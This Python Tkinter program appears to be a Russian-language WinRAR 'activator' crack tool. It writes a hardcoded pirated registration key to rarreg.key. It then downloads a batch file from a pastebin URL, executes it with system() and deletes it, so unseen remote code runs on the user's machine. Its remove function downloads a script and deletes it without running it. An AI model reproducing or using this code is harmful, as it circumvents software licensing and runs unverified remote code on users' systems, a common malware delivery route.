from tkinter import Tk,Canvas,PhotoImage,Button,messagebox,Label,CENTER, Menu
from requests import get
from os import system
import ctypes as ct
from sys import platform
import webbrowser

version = "4.3.1"

if platform == "win32":
    root = Tk()
    root.title('Activator WinRAR')
    root.configure(bg='#000000')
    root.geometry('400x300')
    root.resizable(width=False, height=False)

    root.iconify()
    root.update()
    DWWMA_USE_IMMERSIVE_DARK_MODE = 20
    set_window_attribute = ct.windll.dwmapi.DwmSetWindowAttribute
    get_parent = ct.windll.user32.GetParent
    hwnd = get_parent(root.winfo_id())
    renduring_policy = DWWMA_USE_IMMERSIVE_DARK_MODE
    value = 1
    value = ct.c_int(value)
    set_window_attribute(hwnd, renduring_policy, ct.byref(value), ct.sizeof(value))
    root.update_idletasks()

    f=open(r'banner.png', "wb")
    ufr = get("https://i.imgur.com/Pea4LkY.png")
    f.write(ufr.content)
    f.close()

    canvas = Canvas(root, height=183, width=290, bg="#000000")
    canvas.pack()
    bannerimg = PhotoImage(file='banner.png')
    renderImg = canvas.create_image(145,100, image=bannerimg)

    def goinstallkey():
        lines = ["RAR registration data", "hzfsoft", "Unlimited Company License", "UID=41075b9d18d904e98ab0", "64122122508ab0841c1fa203a621981d6b720ee513acd972c83952", "10d6d4dd47a2b11bd04560fce6cb5ffde62890079861be57638717", "7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565", "b41bcf56929486b8bcdac33d50ecf7739960cf892eda0660311493", "c8b5d1e6c7b497fbb3d3b8621ec3a8ddf317387f56b54e028b3ab0", "b6eac0ccab0822a014f9827a0e48c989c4b72b59383d59b3602da1", "1857cb59fbb2b953885e1eb272671a6d071f9b8de7be2863583398"]
        with open(r"rarreg.key", "w") as file:
            for  line in lines:
                file.write(line + '\n')
        f=open(r'install.bat', "wb")
        ufr = get("https://pastebin.com/raw/vJ05B3Q6")
        f.write(ufr.content)
        f.close()
        system('install.bat')
        system("del /Q install.bat")
        messagebox.showinfo(title="Установлено!", message='Кряк был успешно установлен! Перезапустите WinRAR.')

    def goremovekey():
        f=open(r'del.bat', "wb")
        ufr = get("https://pastebin.com/raw/tzLbxpNb")
        f.write(ufr.content)
        f.close()
        system('del /Q del.bat') 
        messagebox.showinfo(title="Удалено!", message='Кряк был успешно удален! Перезапустите WinRAR.')

    installkey = Button(text='Установить кряк WinRAR', bg="green", fg="white", command=goinstallkey)
    installkey.place(x=120, y=200)

    delkey = Button(text='Удалить кряк WinRAR', bg="red", fg="white", command=goremovekey)
    delkey.place(x=120, y=240)

    def opentgchannel():
        url = "https://t.me/hzfnews"
        webbrowser.open(url, new=2)

    def openytchannel():
        url = "https://www.youtube.com/c/HZFYT"
        webbrowser.open(url, new=2)

    def opendiscord():
        url = "https://discord.com/invite/7bneGfUS5h"
        webbrowser.open(url, new=2)

    def openvkgroup():
        url = "https://vk.com/hzforum1"
        webbrowser.open(url, new=2)

    def devtgopen():
        url = "https://t.me/avencores"
        webbrowser.open(url, new=2)

    def qiwi():
        url = "http://qiwi.com/n/AVENCORESDONATE"
        webbrowser.open(url, new=2)

    def cber():
        messagebox.showinfo(title="Сбер Донат", message="2202 2050 7215 4401")

    def vtb():
        messagebox.showinfo(title="ВТБ Донат", message="2200 2404 1001 8580")

    def omyprog():
        messagebox.showinfo(title="О программе", message=f"""HZF Activator WinRAR - это простая утилита для активации WinRAR.

Автор утилиты: avencores

Интерфейс: Tkinter

Версия: {version}
    """)

    mainmenu = Menu(root) 
    root.config(menu=mainmenu)  

    mygroup = Menu(mainmenu, tearoff=0)
    mygroup.add_command(label="Telegram Channel", command=opentgchannel)
    mygroup.add_command(label="YouTube Channel", command=openytchannel)
    mygroup.add_command(label="Discord Channel", command=opendiscord)
    mygroup.add_command(label="VK Group", command=openvkgroup)

    helpmenu = Menu(mainmenu, tearoff=0)
    helpmenu.add_command(label="Написать разработчику", command=devtgopen)
    helpmenu.add_separator()  
    helpmenu.add_command(label="О программе", command=omyprog)

    donatemenu = Menu(mainmenu, tearoff=0)
    donatemenu.add_command(label="Qiwi Донат", command=qiwi)
    donatemenu.add_command(label="Сбер Донат", command=cber)
    donatemenu.add_command(label="ВТБ Донат", command=vtb)

    mainmenu.add_cascade(label="Информация", menu=mygroup)
    mainmenu.add_cascade(label="Донат", menu=donatemenu)
    mainmenu.add_cascade(label="Справка", menu=helpmenu)

    root.deiconify()
    root.mainloop()
    system("del /Q banner.png")

elif platform == "linux" or platform == "linux2" or platform == "unix":
    messagebox.showerror(title="Unsupported system", message="Ваша система не поддерживается!")